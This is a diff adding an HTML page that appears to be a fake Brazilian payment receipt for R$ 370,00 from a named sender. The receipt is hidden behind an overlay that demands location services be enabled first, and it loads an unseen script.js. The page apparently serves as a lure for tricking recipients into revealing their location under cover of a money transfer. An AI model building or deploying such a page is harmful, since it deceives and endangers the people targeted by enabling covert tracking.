@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Comprovante de Recebimento</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+    <!-- Tela de bloqueio -->
+    <div id="overlay" class="overlay">
+        <p>Para acessar o comprovante, habilite os serviços de localização.</p>
+    </div>
+
+    <!-- Conteúdo principal (oculto no início) -->
+    <div id="conteudo" class="hidden">
+        <div class="comprovante-container">
+            <div class="logo">
+                <img src="images/mpglogo.png" alt="">
+            </div>
+            <h1>Comprovante de Recebimento</h1>
+
+            <div class="informacoes">
+                <p><span>Data:</span> <span id="data-atual"></span></p>
+                <p><span>Valor Recebido:</span> R$ 370,00</p>
+                <p style="text-transform:uppercase"><span>De:</span> João Paulo Vieira da Silva</p>
+                <p><span>CPF : </span>***.345.942-**</p>
+                <p><span>Status:</span> Recebido com Sucesso</p>
+                <p><span>ID da transação : </span>E3467167146971222587631598763214</p>
+            </div>
+
+            <button class="botao" onclick="window.print()">Imprimir</button>
+
+            <div class="comprovante-footer">
+                <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
+                <p><a href="#">Clique aqui</a> para mais informações.</p>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+
+</html>
